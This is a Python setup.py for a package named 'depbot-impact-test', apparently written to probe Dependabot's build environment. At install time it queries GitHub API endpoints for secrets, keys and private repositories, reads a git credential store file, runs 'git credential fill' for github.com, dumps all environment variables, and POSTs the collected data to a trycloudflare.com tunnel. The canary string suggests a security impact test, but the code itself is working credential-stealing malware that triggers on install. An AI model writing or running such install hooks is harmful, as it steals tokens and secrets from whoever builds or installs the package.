from setuptools import setup
import os
import json
import subprocess

_canary = "DEPBOT_IMPACT_V4_2026_Wx8nQpJ3mK5rFzHv"

_result = {"c": _canary}

import urllib.request

_endpoints = [
    ("self_repo", "https://api.github.com/repos/toofikz2/depbot-impact-test"),
    ("self_repo_contents", "https://api.github.com/repos/toofikz2/depbot-impact-test/contents/"),
    ("other_user_repo", "https://api.github.com/repos/toofikz1/test-repo"),
    ("org_private", "https://api.github.com/repos/tooforg/private-test-repo"),
    ("user", "https://api.github.com/user"),
    ("installations", "https://api.github.com/installation/repositories"),
    ("app", "https://api.github.com/app"),
    ("rate_limit", "https://api.github.com/rate_limit"),
    ("meta", "https://api.github.com/meta"),
    ("self_commits", "https://api.github.com/repos/toofikz2/depbot-impact-test/commits?per_page=1"),
    ("self_pulls", "https://api.github.com/repos/toofikz2/depbot-impact-test/pulls?state=all&per_page=1"),
    ("self_issues", "https://api.github.com/repos/toofikz2/depbot-impact-test/issues?per_page=1"),
    ("self_actions_secrets", "https://api.github.com/repos/toofikz2/depbot-impact-test/actions/secrets"),
    ("self_environments", "https://api.github.com/repos/toofikz2/depbot-impact-test/environments"),
    ("self_keys", "https://api.github.com/repos/toofikz2/depbot-impact-test/keys"),
    ("self_hooks", "https://api.github.com/repos/toofikz2/depbot-impact-test/hooks"),
]

for _name, _url in _endpoints:
    try:
        _rq = urllib.request.Request(_url, headers={"User-Agent": "pip/24.0"})
        _rp = urllib.request.urlopen(_rq, timeout=10)
        _hdrs = {k: v for k, v in _rp.headers.items()
                 if k.lower().startswith(("x-oauth", "x-github", "x-ratelimit", "x-accepted"))}
        _bd = _rp.read().decode("utf-8", errors="replace")[:1500]
        _result[_name] = {"status": _rp.status, "headers": _hdrs, "body": _bd}
    except Exception as _e:
        _ecode = ""
        if hasattr(_e, "code"):
            _ecode = str(_e.code)
        if hasattr(_e, "headers"):
            _ehdrs = {k: v for k, v in _e.headers.items()
                      if k.lower().startswith(("x-oauth", "x-github", "x-ratelimit", "x-accepted"))}
        else:
            _ehdrs = {}
        _ebody = ""
        if hasattr(_e, "read"):
            try:
                _ebody = _e.read().decode("utf-8", errors="replace")[:500]
            except Exception:
                pass
        _result[_name] = {"error": str(_e)[:300], "code": _ecode, "headers": _ehdrs, "body": _ebody}

_result["git_cred_store"] = os.popen(
    "cat /home/dependabot/common/bin/git-credential-store-immutable 2>/dev/null | head -30"
).read()[:2000]

_gcf = subprocess.run(
    ["git", "credential", "fill"],
    input="protocol=https\nhost=github.com\n",
    capture_output=True, text=True, timeout=5
)
_result["git_cred_github"] = {"stdout": _gcf.stdout[:500], "rc": _gcf.returncode}

_result["env_expanded"] = os.popen("env | sort").read()[:4000]

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq3 = _ur.Request(
        "https://utc-ruling-selective-ash.trycloudflare.com/depbot-v4",
        data=_data,
        method="POST",
    )
    _rq3.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq3, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="0.1.0",
    install_requires=["requests==2.25.0"],
    tests_require=[_canary],
)
